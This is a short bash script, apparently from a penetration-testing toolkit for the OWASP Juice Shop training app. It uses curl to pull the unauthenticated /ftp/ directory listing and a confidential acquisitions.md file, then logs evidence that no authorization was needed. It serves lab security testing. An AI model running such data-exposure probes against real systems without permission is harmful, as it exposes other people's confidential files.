#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# scripts/06_exposure.sh — Phase 7: Sensitive data exposure
#
# Fetches the unauthenticated /ftp/ directory listing and the confidential
# /ftp/acquisitions.md file to prove the files are readable without any
# authentication or authorization check.
# ---------------------------------------------------------------------------
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

require curl "apt install curl / brew install curl"

OUT_DIR="${VAPT_ROOT}/${RESULTS_DIR}/exposure"
mkdir -p "$OUT_DIR"

log "Fetching unauthenticated directory listing at ${TARGET_URL}/ftp/ ..."
curl -fsS "${TARGET_URL}/ftp/" -o "${OUT_DIR}/ftp_directory_listing.html"
ok "Saved ${OUT_DIR}/ftp_directory_listing.html"

log "Fetching confidential file ${TARGET_URL}/ftp/acquisitions.md ..."
if curl -fsS "${TARGET_URL}/ftp/acquisitions.md" -o "${OUT_DIR}/acquisitions.md"; then
  ok "Confidential file retrieved without authentication: ${OUT_DIR}/acquisitions.md"
else
  warn "acquisitions.md not reachable directly — check ${OUT_DIR}/ftp_directory_listing.html for the exact filename served by this Juice Shop version."
fi

{
  echo "=== Evidence: unauthenticated access ==="
  echo "GET ${TARGET_URL}/ftp/            -> directory listing (no Authorization header sent)"
  echo "GET ${TARGET_URL}/ftp/acquisitions.md -> confidential file contents (no Authorization header sent)"
} | tee "$(logfile 06_exposure)" > "${OUT_DIR}/evidence_summary.txt"

ok "Exposure evidence saved under ${OUT_DIR}/"
